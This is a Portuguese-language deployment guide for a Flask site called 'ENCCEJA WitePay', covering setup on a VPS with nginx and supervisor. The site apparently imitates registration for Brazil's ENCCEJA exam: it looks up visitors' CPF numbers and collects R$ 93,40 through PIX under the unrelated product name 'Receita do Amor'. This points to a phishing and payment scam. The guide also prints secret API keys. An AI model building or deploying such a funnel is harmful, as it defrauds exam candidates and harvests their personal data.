# 🚀 INSTRUÇÕES DE DEPLOYMENT - ENCCEJA WITEPAY

## Arquivos Gerados para VPS

1. **encceja-witepay-deployment.tar.gz** - Pacote completo do projeto
2. **VPS_UBUNTU_DEPLOYMENT_GUIDE.md** - Guia detalhado de deployment
3. **deploy_vps.sh** - Script automático de instalação
4. **vps_requirements.txt** - Dependências Python

## 📦 PASSO A PASSO RÁPIDO

### 1. Conectar ao VPS
```bash
ssh root@SEU_IP_VPS
```

### 2. Fazer Upload do Projeto
**Opção A - Via SCP (do seu computador):**
```bash
scp encceja-witepay-deployment.tar.gz root@SEU_IP_VPS:/root/
```

**Opção B - Via painel Hostinger:**
- Use o File Manager para upload do arquivo .tar.gz

### 3. Extrair e Instalar
```bash
cd /root
tar -xzf encceja-witepay-deployment.tar.gz
cd encceja-witepay-deployment
bash deploy_vps.sh
```

### 4. Copiar Arquivos do Projeto
```bash
# Após executar deploy_vps.sh, copie os arquivos:
cp app.py /var/www/encceja/
cp -r templates/ /var/www/encceja/
cp -r static/ /var/www/encceja/

# Reiniciar aplicação
supervisorctl restart encceja
```

## ✅ VERIFICAÇÃO

### Testar se funciona:
```bash
curl -I http://localhost:5000
# Deve retornar HTTP/1.1 200 OK
```

### Ver logs:
```bash
tail -f /var/log/encceja.log
```

### Status dos serviços:
```bash
supervisorctl status encceja
systemctl status nginx
```

## 🌐 ACESSO

Após o deploy, acesse:
- **IP**: `http://SEU_IP_VPS`
- **Domínio**: `http://seu-dominio.com` (se configurado)

## 📋 RECURSOS FUNCIONAIS

- ✅ **Consulta CPF**: API real funcionando
- ✅ **PIX WitePay**: R$ 93,40 com QR Code
- ✅ **Funnel Completo**: inscricao → validar-dados → endereco → local-prova → pagamento
- ✅ **Templates**: Todos os HTMLs preservados
- ✅ **Responsivo**: Mobile e desktop

## 🔧 CONFIGURAÇÕES IMPORTANTES

### Chaves API Configuradas:
- **WitePay**: `sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d`
- **CPF API**: `1285fe4s-e931-4071-a848-3fac8273c55a`

### Dados Padrão PIX:
- **Email**: gerarpagamentos@gmail.com
- **Telefone**: (11) 98779-0088
- **Produto**: Receita do Amor
- **Valor**: R$ 93,40

## 🆘 SUPORTE

Se precisar de ajuda:
1. Consulte `VPS_UBUNTU_DEPLOYMENT_GUIDE.md`
2. Verifique logs: `tail -f /var/log/encceja.log`
3. Reinicie: `supervisorctl restart encceja`

**Projeto pronto para produção!** 🎉